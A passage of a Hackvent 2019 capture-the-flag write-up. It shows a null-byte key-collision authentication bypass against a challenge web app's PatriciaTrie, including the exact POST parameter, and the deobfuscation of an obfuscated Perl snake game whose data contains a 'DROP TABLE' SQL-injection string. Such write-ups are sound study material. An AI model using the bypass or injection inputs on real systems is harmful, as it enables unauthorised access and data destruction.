            trie.put(unescapeJava(note), 0);
        }
    
        private static PatriciaTrie<Integer> init(){
            PatriciaTrie<Integer> trie = new PatriciaTrie<Integer>();
            trie.put(securitytoken,0);
    
            return trie;
        }
    
        private static boolean isAdmin(PatriciaTrie<Integer> trie){
            return !trie.containsKey(securitytoken);
        }
    
        private static InputStream getStreamFromResourcesFolder(String filePath) {
              return Thread.currentThread().getContextClassLoader().getResourceAsStream(filePath);
             }
    
    }
    

Right away I’m drawn to the `getTrie()` function. It calls `isAdmin(trie)`,
and then if the answer is no, it prints “INTRUSION WILL BE REPORTED!”, which
is familiar.

`isAdmin` checks if the `trie` contains the token `securitytoken`, which is
the static string “auth_token_4835989”. If that token is NOT there, it returns
admin.

Time to figure out what a Particia Tree is. It’s a specific [radix
tree](https://en.wikipedia.org/wiki/Radix_tree) with radix of two. So it’s a
data structure that stores things in a tree sorted by common prefix.

It also has a vulnerability in it’s implementation in `CommonCollections` from
April, where it ignores trailing [unicode
null](https://issues.apache.org/jira/browse/COLLECTIONS-714). That means that
it thinks `x` and `x\u0000` are the same thing. But Java will differentiate
between them, which can lead to weirdness.

I took a look at my POST request in Burp:

![image-20191212211618105](https://0xdfimages.gitlab.io/img/image-20191212211618105.png)

First, I tried adding the null characters to the `ViewState` by sending this
request over to Burp Repeater. It crashed the page, with a title of “Error -
viewId:/index.xhtml - View /index.xhtml could not be restored.”. I tried with
it the other parameters, and on `j_idt14:name`, I actually made a mistake and
appended `\u000` (only three 0s, not 4). In HTTP 500 that came back, it had
the following error:

    
    
    javax.faces.component.UpdateModelException: javax.el.ELException: /index.xhtml @19,52 value="#{notesBean.trie}": Error writing [trie] on type [com.jwt.jsf.bean.NotesBean]
    

It failed writing to `trie`! That means what I POST gets written to `trie`.
And, in the callstack, there’s this:

    
    
    com.jwt.jsf.bean.NotesBean.setTrie(NotesBean.java:43)
    

So it’s happening in the `setTrie` function. So now I can theorize that that
parameter is being passed to `setTrie()`.

I’ve got all the pieces now to make this attack. The `trie` object is
initialized with a key of `securitytoken` (or `auth_token_4835989`) with value
0. Then I post something, and the name field is passed to `setTrie`, which
tries to write a second key with my input and value 0. Then `getTrie` is
called, which calls `isAdmin`. To be admin, the key `auth_token_4835989` has
to not be there.

If I post with the name of `auth_token_4835989\u0000`, due to the bug in
Common Collections PatriciaTrie, it will overwrite the original key with mine.
Then when Java checks to see if the key `auth_token_4835989` is present, it
won’t be, because only `auth_token_4835989\u0000` remains.

In practice, I POST with `j_idt14%3Aname=auth_token_4835989%5cu0000` (rest of
the parameters the same), and I get back:

    
    
    HTTP/1.1 200 
    X-Powered-By: JSF/2.0
    Content-Type: text/html;charset=UTF-8
    Content-Length: 560
    Date: Fri, 13 Dec 2019 02:31:03 GMT
    Connection: close
    
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml"><head>
         <title>SpyPortal</title><link type="text/css" rel="stylesheet" href="/trieme/faces/javax.faces.resource/style.css?ln=css" /></head><body>
         <h3>Secret Spy Portal</h3>
         <h4>STATUS:
          We will steal all the national chocolate supplies at christmas, 3pm: Here's the building codes: HV19{get_th3_chocolateZ}
          
      !</h4></body>
    </html>
    

**Flag:`HV19{get_th3_chocolateZ}`**

## Day 14

### Challenge

![hv19-ball14](https://0xdfimages.gitlab.io/img/hv19-ball14.png) | HV19.14 Achtung das Flag  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN  
![programming](../img/hv-cat-programming.png)PROGRAMMING  
Level: | medium  
Author: |  M.   
  
> Let’s play another little game this year. Once again, I promise it is hardly
> obfuscated.

I’m given this code:

    
    
    use Tk;use MIME::Base64;chomp(($a,$a,$b,$c,$f,$u,$z,$y,$r,$r,$u)=<DATA>);sub M{$M=shift;##
    @m=keys %::;(grep{(unpack("%32W*",$_).length($_))eq$M}@m)[0]};$zvYPxUpXMSsw=0x1337C0DE;###
    /_help_me_/;$PMMtQJOcHm8eFQfdsdNAS20=sub{$zvYPxUpXMSsw=($zvYPxUpXMSsw*16807)&0xFFFFFFFF;};
    ($a1Ivn0ECw49I5I0oE0='07&3-"11*/(')=~y$!-=$`-~$;($Sk61A7pO='K&:P3&44')=~y$!-=$`-~$;m/Mm/g;
    ($sk6i47pO='K&:R&-&"4&')=~y$!-=$`-~$;;;;$d28Vt03MEbdY0=sub{pack('n',$fff[$S9cXJIGB0BWce++]
    ^($PMMtQJOcHm8eFQfdsdNAS20->()&0xDEAD));};'42';($vgOjwRk4wIo7_=MainWindow->new)->title($r)
    ;($vMnyQdAkfgIIik=$vgOjwRk4wIo7_->Canvas("-$a"=>640,"-$b"=>480,"-$u"=>$f))->pack;@p=(42,42
    );$cqI=$vMnyQdAkfgIIik->createLine(@p,@p,"-$y"=>$c,"-$a"=>3);;;$S9cXJIGB0BWce=0;$_2kY10=0;
    $_8NZQooI5K4b=0;$Sk6lA7p0=0;$MMM__;$_=M(120812).'/'.M(191323).M(133418).M(98813).M(121913)
    .M(134214).M(101213).'/'.M(97312).M(6328).M(2853).'+'.M(4386);s|_||gi;@fff=map{unpack('n',
    $::{M(122413)}->($_))}m:...:g;($T=sub{$vMnyQdAkfgIIik->delete($t);$t=$vMnyQdAkfgIIik->#FOO
    createText($PMMtQJOcHm8eFQfdsdNAS20->()%600+20,$PMMtQJOcHm8eFQfdsdNAS20->()%440+20,#Perl!!
    "-text"=>$d28Vt03MEbdY0->(),"-$y"=>$z);})->();$HACK;$i=$vMnyQdAkfgIIik->repeat(25,sub{$_=(
    $_8NZQooI5K4b+=0.1*$Sk6lA7p0);;$p[0]+=3.0*cos;$p[1]-=3*sin;;($p[0]>1&&$p[1]>1&&$p[0]<639&&
    $p[1]<479)||$i->cancel();00;$q=($vMnyQdAkfgIIik->find($a1Ivn0ECw49I5I0oE0,$p[0]-1,$p[1]-1,
    $p[0]+1,$p[1]+1)||[])->[0];$q==$t&&$T->();$vMnyQdAkfgIIik->insert($cqI,'end',\@p);($q==###
    $cqI||$S9cXJIGB0BWce>44)&&$i->cancel();});$KE=5;$vgOjwRk4wIo7_->bind("<$Sk61A7pO-n>"=>sub{
    $Sk6lA7p0=1;});$vgOjwRk4wIo7_->bind("<$Sk61A7pO-m>"=>sub{$Sk6lA7p0=-1;});$vgOjwRk4wIo7_#%"
    ->bind("<$sk6i47pO-n>"=>sub{$Sk6lA7p0=0 if$Sk6lA7p0>0;});$vgOjwRk4wIo7_->bind("<$sk6i47pO"
    ."-m>"=>sub{$Sk6lA7p0=0 if $Sk6lA7p0<0;});$::{M(7998)}->();$M_decrypt=sub{'HACKVENT2019'};
    __DATA__
    The cake is a lie!
    width
    height
    orange
    black
    green
    cyan
    fill
    Only perl can parse Perl!
    Achtung das Flag! --> Use N and M
    background
    M'); DROP TABLE flags; -- 
    Run me in Perl!
    __DATA__
    

### Solution

#### Play It

I’ll run the game, and it’s a game of snake, where I have to collect the flag,
two characters at a time:

![image-20191213225825036](https://0xdfimages.gitlab.io/img/image-20191213225825036.png)

I can play manually, but the flag is long, and it’s nearly impossible not to
run into yourself and lose.

#### Source Analysis

The first thing I did, just liked [last year’s Flappy Bird Perl
challenge](/hackvent2018/#day-7), was add whitespace to make the program more
readable:

    
    
    use Tk;
    use MIME::Base64;
    chomp(($a,$a,$b,$c,$f,$u,$z,$y,$r,$r,$u)=<DATA>);
    sub M {
        $M=shift;##
        @m=keys %::;
        (grep{(unpack("%32W*",$_).length($_))eq$M}@m)[0]
    };
    $zvYPxUpXMSsw=0x1337C0DE;###
    /_help_me_/;
    $PMMtQJOcHm8eFQfdsdNAS20=sub{
        $zvYPxUpXMSsw=($zvYPxUpXMSsw*16807)&0xFFFFFFFF;
    };
    ($a1Ivn0ECw49I5I0oE0='07&3-"11*/(')=~y$!-=$`-~$;
    ($Sk61A7pO='K&:P3&44')=~y$!-=$`-~$;m/Mm/g;
    ($sk6i47pO='K&:R&-&"4&')=~y$!-=$`-~$;;;;
    $d28Vt03MEbdY0=sub{
        pack('n',$fff[$S9cXJIGB0BWce++]
        ^($PMMtQJOcHm8eFQfdsdNAS20->()&0xDEAD));
    };
    '42';
    ($vgOjwRk4wIo7_=MainWindow->new)->title($r);
    ($vMnyQdAkfgIIik=$vgOjwRk4wIo7_->Canvas("-$a"=>640,"-$b"=>480,"-$u"=>$f))->pack;
    @p=(42,42);
    $cqI=$vMnyQdAkfgIIik->createLine(@p,@p,"-$y"=>$c,"-$a"=>3);;;
    $S9cXJIGB0BWce=0;$_2kY10=0;
    $_8NZQooI5K4b=0;
    $Sk6lA7p0=0;
    $MMM__;
    $_=M(120812).'/'.M(191323).M(133418).M(98813).M(121913).M(134214).M(101213).'/'.M(97312).M(6328).M(2853).'+'.M(4386);
    s|_||gi;
    @fff=map{unpack('n',$::{M(122413)}->($_))}m:...:g;
    ($T=sub{
        $vMnyQdAkfgIIik->delete($t);
        $t=$vMnyQdAkfgIIik->#FOO
            createText($PMMtQJOcHm8eFQfdsdNAS20->()%600+20,
                       $PMMtQJOcHm8eFQfdsdNAS20->()%440+20,#Perl!!
                       "-text"=>$d28Vt03MEbdY0->(),
                       "-$y"=>$z);
    })->();
    $HACK;
    $i=$vMnyQdAkfgIIik->repeat(25,sub{
        $_=($_8NZQooI5K4b+=0.1*$Sk6lA7p0);;
        $p[0]+=3.0*cos;
        $p[1]-=3*sin;;
        ($p[0]>1&&$p[1]>1&&$p[0]<639&&$p[1]<479)||$i->cancel();
        00;
        $q=($vMnyQdAkfgIIik->find($a1Ivn0ECw49I5I0oE0,$p[0]-1,$p[1]-1,$p[0]+1,$p[1]+1)||[])->[0];
        $q==$t&&$T->();
        $vMnyQdAkfgIIik->insert($cqI,'end',\@p);
        ($q==$cqI||$S9cXJIGB0BWce>44)&&$i->cancel();
    });
    $KE=5;
    $vgOjwRk4wIo7_->bind("<$Sk61A7pO-n>"=>sub{
        $Sk6lA7p0=1;
    });
    $vgOjwRk4wIo7_->bind("<$Sk61A7pO-m>"=>sub{
        $Sk6lA7p0=-1;
    });
    $vgOjwRk4wIo7_->bind("<$sk6i47pO-n>"=>sub{
        $Sk6lA7p0=0 if$Sk6lA7p0>0;
    });
    $vgOjwRk4wIo7_->bind("<$sk6i47pO-m>"=>sub{
        $Sk6lA7p0=0 if $Sk6lA7p0<0;
    });
    
    $::{M(7998)}->();
    $M_decrypt=sub{'HACKVENT2019'};
    __DATA__
    The cake is a lie!
    width
    height
    orange
    black
    green
    cyan
    fill
    Only perl can parse Perl!
    Achtung das Flag! --> Use N and M
    background
    M'); DROP TABLE flags; -- 
    Run me in Perl!
    __DATA__
    

The game is using [TK](https://metacpan.org/pod/Tk::UserGuide), a framework
for writing GUI applications. Right away I can identify the main loop:

    
    
    $i=$vMnyQdAkfgIIik->repeat(25,sub{
        $_=($_8NZQooI5K4b+=0.1*$Sk6lA7p0);;
        $p[0]+=3.0*cos;
        $p[1]-=3*sin;;
        ($p[0]>1&&$p[1]>1&&$p[0]<639&&$p[1]<479)||$i->cancel();
        00;
        $q=($vMnyQdAkfgIIik->find($a1Ivn0ECw49I5I0oE0,$p[0]-1,$p[1]-1,$p[0]+1,$p[1]+1)||[])->[0];
        $q==$t&&$T->();
        $vMnyQdAkfgIIik->insert($cqI,'end',\@p);
        ($q==$cqI||$S9cXJIGB0BWce>44)&&$i->cancel();
    });
    

I can’t say for certain what everything here does, but it looks like `$p` has
to do with my position. I think this first line calculates the current angle
of velocity, where 0 is due left, and so is 2\\(\pi\\). Then there is math to
update the x (`p[1]`) and y (`p[0]`) positions using the sin and cos based on
the current angle.

Then there’s a check to see if the position falls within the screen, and to
call `$i->cancel();` if not.

Then there’s a line that sets `$q` to something based on the current position.
The next line checks if `$q==$t`, and if so, it calls `$T`. This is the check
to see if the snake is at the place where the current flag piece is. I can
check out `$T`:

    
    
    ($T=sub{
        $vMnyQdAkfgIIik->delete($t);
        $t=$vMnyQdAkfgIIik->#FOO
            createText($PMMtQJOcHm8eFQfdsdNAS20->()%600+20,
                       $PMMtQJOcHm8eFQfdsdNAS20->()%440+20,#Perl!!
                       "-text"=>$d28Vt03MEbdY0->(),
                       "-$y"=>$z);
    })->();
    

It calls the canvas’ `delete` method on the current text object, and then
creates a new one, using `$PMMtQJOcHm8eFQfdsdNAS20` to generate random looking
(though the same every time) values, and mod to keep it within the canvas. The
text of the text object is created by calling `$d28Vt03MEbdY0`. I can check
that out:

    
    
    $d28Vt03MEbdY0=sub{
        pack('n',$fff[$S9cXJIGB0BWce++]
        ^($PMMtQJOcHm8eFQfdsdNAS20->()&0xDEAD));
    };
    

I’ll come back to this.

The last two lines of the look seem to add the current position into `$cqI`,
which I guess is a list of occupied positions, and then checks if `$q` (some
measure of position) is equal to `$cqI` (must return true if it’s in the list
at all), or if `$S9cXJIGB0BWce` is greater than 44, and exits if either.
`$S9cXJIGB0BWce` appears to be a counter referenced both here and in the
function generating the text values.

Just looking at that, I’m expecting 45 blocks of two characters, or 90
characters in the flag.

Just after the loop, there’s a section that updates based on the key presses:

    
    
    $KE=5;
    $vgOjwRk4wIo7_->bind("<$Sk61A7pO-n>"=>sub{
        $Sk6lA7p0=1;
    });
    $vgOjwRk4wIo7_->bind("<$Sk61A7pO-m>"=>sub{
        $Sk6lA7p0=-1;
    });
    $vgOjwRk4wIo7_->bind("<$sk6i47pO-n>"=>sub{
        $Sk6lA7p0=0 if$Sk6lA7p0>0;
    });
    $vgOjwRk4wIo7_->bind("<$sk6i47pO-m>"=>sub{
        $Sk6lA7p0=0 if $Sk6lA7p0<0;
    });
    

It looks like it’s setting variables based on `n` or `m` being pressed.

#### Modifications

The first thing I did way to remove two of the three exit conditions. I’ll
comment out the first check, and the first half of the second:

    
    
    $i=$vMnyQdAkfgIIik->repeat(25,sub{
        $_=($_8NZQooI5K4b+=0.1*$Sk6lA7p0);;
        $p[0]+=3.0*cos;
        $p[1]-=3*sin;;
        #($p[0]>1&&$p[1]>1&&$p[0]<639&&$p[1]<479)||$i->cancel();
        00;
        $q=($vMnyQdAkfgIIik->find($a1Ivn0ECw49I5I0oE0,$p[0]-1,$p[1]-1,$p[0]+1,$p[1]+1)||[])->[0];
        $q==$t&&$T->();
        $vMnyQdAkfgIIik->insert($cqI,'end',\@p);
        #($q==$cqI||$S9cXJIGB0BWce>44)&&$i->cancel();
        ($S9cXJIGB0BWce>44)&&$i->cancel();
    });
    

Now, I can play and not die when I hit myself. I started playing, but writing
down the flag while playing was too much. So I went into the function that
creates the text. Perl has this implicit return, so as is, it just returns the
output of the one line:

    
    
    $d28Vt03MEbdY0=sub{
        pack('n',$fff[$S9cXJIGB0BWce++]^($PMMtQJOcHm8eFQfdsdNAS20->()&0xDEAD));
    };
    

I’ll simply change that a bit:

    
    
    $d28Vt03MEbdY0=sub{
        $a = pack('n',$fff[$S9cXJIGB0BWce++]^($PMMtQJOcHm8eFQfdsdNAS20->()&0xDEAD));
        print $a;
        return $a
    };
    

Now, as the letters are created, they are also printed to the terminal. I’ll
play for a bit, and eventually collect all the flags, and find the full flag
printed out on my console:

    
    
    $ perl prog-mod.pl 
    HV19{s@@jSfx4gPcvtiwxPCagrtQ@,y^p-za-oPQ^a-z\x20\n^&&s[(.)(..)][\2\1]g;s%4(...)%"p$1t"%ee}
    

But, that still took a bit of effort. I can chop out more, and make it go
fast. With my modification to make it print still in there, I’ll remove the
need for the snake:

    
    
    $i=$vMnyQdAkfgIIik->repeat(50,sub{
        #$_=($_8NZQooI5K4b+=0.1*$Sk6lA7p0);;
        #$p[0]+=3.0*cos;
        #$p[1]-=3*sin;;
        #($p[0]>1&&$p[1]>1&&$p[0]<639&&$p[1]<479)||$i->cancel();
        #00;
        #$q=($vMnyQdAkfgIIik->find($a1Ivn0ECw49I5I0oE0,$p[0]-1,$p[1]-1,$p[0]+1,$p[1]+1)||[])->[0];
        #$q==$t&&$T->();
        $T->();
        #$vMnyQdAkfgIIik->insert($cqI,'end',\@p);
        #($q==$cqI||$S9cXJIGB0BWce>44)&&$i->cancel();
        ($S9cXJIGB0BWce>44)&&$i->cancel();
    });
    

Now it just calls `$T` on each loop until it reaches max. When I run this, I
get the flag within a couple seconds:

![](https://0xdfimages.gitlab.io/img/hv19-prog-mod2.gif)

**Flag:`HV19{s@@jSfx4gPcvtiwxPCagrtQ@,y^p-za-
oPQ^a-z\x20\n^&&s[(.)(..)][\2\1]g;s%4(...)%"p$1t"%ee}`**

#### Deparse

Something I didn’t know about, but discovered after solving day 14 was the
Deparse module for Perl. It compiles the code, and the decompiles it,
formatting it nicely, removing a lot of the obfuscation.

    
    
    $ perl -MO=Deparse prog.pl > prog-deparse.py
    prog.pl syntax OK
    

Now I’ve got cleaner code:

    
    
    sub Tk::Toplevel::FG_Destroy;
    sub Tk::Toplevel::FG_BindOut;
    sub Tk::Toplevel::FG_BindIn;
    sub Tk::Toplevel::FG_In;
    sub Tk::Toplevel::FG_Create;
    sub Tk::Toplevel::FG_Out;
    sub Tk::Frame::labelVariable;
    sub Tk::Frame::freeze_on_map;
    sub Tk::Frame::AddScrollbars;
    sub Tk::Frame::queuePack;
    sub Tk::Frame::scrollbars;
    sub Tk::Frame::sbset;
    sub Tk::Frame::label;
    sub Tk::Frame::packscrollbars;
    sub Tk::Frame::labelPack;
    sub Tk::Frame::FindMenu;
    use Tk;
    use MIME::Base64;
    chomp(($a, $a, $b, $c, $f, $u, $z, $y, $r, $r, $u) = readline DATA);
    sub M {
        $M = shift();
        @m = keys %main::;
        (grep {unpack('%32W*', $_) . length($_) eq $M;} @m)[0];
    }
    $zvYPxUpXMSsw = 322420958;
    /_help_me_/;
    $PMMtQJOcHm8eFQfdsdNAS20 = sub {
        $zvYPxUpXMSsw = $zvYPxUpXMSsw * 16807 & 4294967295;
    }
    ;
    ($a1Ivn0ECw49I5I0oE0 = '07&3-"11*/(') =~ tr/!-=/`-|/;
    ($Sk61A7pO = 'K&:P3&44') =~ tr/!-=/`-|/;
    /Mm/g;
    ($sk6i47pO = 'K&:R&-&"4&') =~ tr/!-=/`-|/;
    $d28Vt03MEbdY0 = sub {
        pack 'n', $fff[$S9cXJIGB0BWce++] ^ &$PMMtQJOcHm8eFQfdsdNAS20() & 57005;
    }
    ;
    '???';
    ($vgOjwRk4wIo7_ = 'MainWindow'->new)->title($r);
    ($vMnyQdAkfgIIik = $vgOjwRk4wIo7_->Canvas("-$a", 640, "-$b", 480, "-$u", $f))->pack;
    @p = (42, 42);
    $cqI = $vMnyQdAkfgIIik->createLine(@p, @p, "-$y", $c, "-$a", 3);
    $S9cXJIGB0BWce = 0;
    $_2kY10 = 0;
    $_8NZQooI5K4b = 0;
    $Sk6lA7p0 = 0;
    $MMM__;
    $_ = M(120812) . '/' . M(191323) . M(133418) . M(98813) . M(121913) . M(134214) . M(101213) . '/' . M(97312) . M(6328) . M(2853) . '+' . M(4386);
    s/_//gi;
    @fff = map({unpack 'n', $main::{M 122413}($_);} /.../g);
    ($T = sub {
        $vMnyQdAkfgIIik->delete($t);
        $t = $vMnyQdAkfgIIik->createText(&$PMMtQJOcHm8eFQfdsdNAS20() % 600 + 20, &$PMMtQJOcHm8eFQfdsdNAS20() % 440 + 20, '-text', &$d28Vt03MEbdY0(), "-$y", $z);
    }
    )->();
    $HACK;
    $i = $vMnyQdAkfgIIik->repeat(25, sub {
        $_ = $_8NZQooI5K4b += 0.1 * $Sk6lA7p0;
        $p[0] += 3 * cos($_);
        $p[1] -= 3 * sin($_);
        $i->cancel unless $p[0] > 1 and $p[1] > 1 and $p[0] < 639 and $p[1] < 479;
        '???';
        $q = +($vMnyQdAkfgIIik->find($a1Ivn0ECw49I5I0oE0, $p[0] - 1, $p[1] - 1, $p[0] + 1, $p[1] + 1) || [])->[0];
        &$T() if $q == $t;
        $vMnyQdAkfgIIik->insert($cqI, 'end', \@p);
        $i->cancel if $q == $cqI or $S9cXJIGB0BWce > 44;
    }
    );
    $KE = 5;
    $vgOjwRk4wIo7_->bind("<$Sk61A7pO-n>", sub {
        $Sk6lA7p0 = 1;
    }
    );
    $vgOjwRk4wIo7_->bind("<$Sk61A7pO-m>", sub {
        $Sk6lA7p0 = -1;
    }
    );
    $vgOjwRk4wIo7_->bind("<$sk6i47pO-n>", sub {
        $Sk6lA7p0 = 0 if $Sk6lA7p0 > 0;
    }
    );
    $vgOjwRk4wIo7_->bind("<$sk6i47pO" . '-m>', sub {
        $Sk6lA7p0 = 0 if $Sk6lA7p0 < 0;
    }
    );
    $main::{M 7998}();
    $M_decrypt = sub {
        'HACKVENT2019';
    }
    ;
    __DATA__
    The cake is a lie!
    width
    height
    orange
    black
    green
    cyan
    fill
    Only perl can parse Perl!
    Achtung das Flag! --> Use N and M
    background
    M'); DROP TABLE flags; -- 
    Run me in Perl!
    __DATA__
    

## Hidden 4

### Challenge

![hv19-ballH4](https://0xdfimages.gitlab.io/img/hv19-ballH4.png) | HV19.H4 Hidden Four  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN  
![programming](../img/hv-cat-programming.png)PROGRAMMING  
Level: | novice  
Author: |  M.   
  
There’s no description.

### Solution

The day 14 challenge was all about obfuscated Perl, and the flag was weird,
`s@@jSfx4gPcvtiwxPCagrtQ@,y^p-za-
oPQ^a-z\x20\n^&&s[(.)(..)][\2\1]g;s%4(...)%"p$1t"%ee`. That kind of looked
like Perl to me. So I saved it in a file, `flag.pl`, and ran it:

    
    
    $ perl flag.pl 
    Squ4ring the Circle
    

And that’s the hidden flag, novice indeed.

**Flag:`HV19{Squ4ring the Circle}`**

[](/hackvent2019/medium)

